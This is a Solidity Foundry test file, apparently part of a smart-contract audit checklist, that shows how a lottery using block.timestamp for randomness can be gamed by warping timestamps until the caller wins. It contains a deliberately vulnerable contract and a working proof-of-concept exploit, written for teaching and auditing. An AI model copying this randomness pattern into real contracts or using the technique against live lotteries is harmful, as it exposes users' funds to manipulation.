// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-MA-2
 *
 * This test demonstrates how using `block.timestamp` for randomness in a lottery contract can be exploited by miners.
 * A miner can manipulate the `block.timestamp` to influence the outcome of the randomNumber and potentially win the lottery.
 * The test attempts to call the pickWinner function repeatedly in the same block to find desired 'randomNumber' by manipulating block timestamp
 */
contract Lottery {
    address public winner;

    function pickWinner() public {
        // Vulnerable randomness generation using block.timestamp
        uint256 randomNumber = uint256(block.timestamp) % 100;
        if (randomNumber == 7) {
            winner = msg.sender;
        } else {
            winner = address(0);
        }
    }

    function getBlockTimestamp() public view returns (uint256) {
        return block.timestamp;
    }
}

contract LotteryTest is Test {
    Lottery public lottery;
    address public attacker = address(0x123);

    function setUp() public {
        lottery = new Lottery();
        vm.deal(attacker, 1 ether);
    }

    function testPredictableRandomness() public {
        vm.startPrank(attacker);

        uint256 initialTimestamp = block.timestamp;
        bool winnerFound = false;

        // Try timestamps close to current to find a winning timestamp.
        for (uint256 i = 0; i < 10; i++) {
            uint256 manipulatedTimestamp = initialTimestamp + i;  // Slightly modify the timestamp

            // Manually set the block timestamp for the next call.
            // NOTE: This is a realistic manipulation that could occur in practice
            vm.warp(manipulatedTimestamp);

            lottery.pickWinner();
            if (lottery.winner() == attacker) {
                winnerFound = true;
                break;
            }
        }

        assertTrue(winnerFound, "Attacker should be able to manipulate timestamp to win");
        vm.stopPrank();
    }
}